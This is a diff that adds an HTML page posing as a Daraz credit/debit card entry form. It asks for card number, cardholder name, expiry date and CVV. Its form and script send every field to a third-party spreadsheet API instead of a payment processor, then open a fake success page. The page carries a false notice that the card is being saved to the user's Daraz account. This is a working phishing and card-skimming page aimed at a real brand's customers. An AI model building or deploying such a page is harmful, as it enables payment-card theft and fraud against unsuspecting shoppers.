@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daraz Credit Card Payment Form</title>
+  <link rel="stylesheet" href="./style.css">
+    <link rel="icon" href="tabicon.png">
+ 
+<div class="topnav">
+  <a href="#home" class="active">
+    <img src="creditcard.png" height="50px"></a>
+    <P align="center">Add a Credit / Debit Card</P>
+  </div>  
+</head>
+
+<body>
+<form action="https://sheetdb.io/api/v1/c0eb8kgqafs4c" method="post" id="sheetdb-form"  >
+<br><br>
+<br><br>
+<div class="blank"></div>
+<div class="payment-title">
+<img src="setpay.png" height="40px;" align="left">
+</div>
+    <div class="form-container">
+
+        <div class="field-container">
+        	<label for="cardnumber" class="fb"><font color="red">*</font>Card number</label>
+          <div class="blank"></div>
+            <input id="cardnumber" maxlength="20" type="text" inputmode="numeric" autocomplete="autocomplete" autofocus="autofocus"
+            placeholder="Card Number" required 
+             name="data[Card Number]">
+        </div>
+
+        <div class="field-container">
+        	<label for="cardname"><font color="red">*</font>Name on card
+        	</label>
+           <div class="blank"></div> 
+            <input id="name" type="text" maxlength="25" autocomplete="autocomplete"
+            placeholder="Name on card" required  name="data[Card Holder]">        
+        </div>
+        <div class="field-container">
+        	<label for="expiration"><font color="red">*</font>Expiration date
+        	</label>
+           <div class="blank"></div>
+            <input id="expirationdate" inputmode="numeric" placeholder="MM/YY" required name="data[MM/YY]">
+        </div>
+
+        <div class="field-container">
+        	<label for="cvv"><font color="red">*</font>CVV
+        	</label>
+           <div class="blank"></div>
+            <input id="securitycode" inputmode="numeric" maxlength="3" placeholder="CVV" required name="data[CVV]"s>
+        </div>
+    </div> 
+    
+    <div class="botcontain">
+         <div class="para">
+             <p align="left">I acknowledge that my card information is saved in my Daraz account for subsequent transactions.</p>
+          </div>
+          <br>
+          <div class="creditbtn">
+             <button type="submit">Submit
+             </button>
+          </div>
+    </div>     
+
+</form>
+
+<div class="loadex">
+    <img src="loadex.gif"  alt="Loading..." />
+</div>
+ <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('success/index.html', '_blank');
+
+          });
+        });
+ </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js'></script>
+  <script  src="./script.js"></script> 
+  <script  src="load.js"></script>
+
+</body>
+</html>
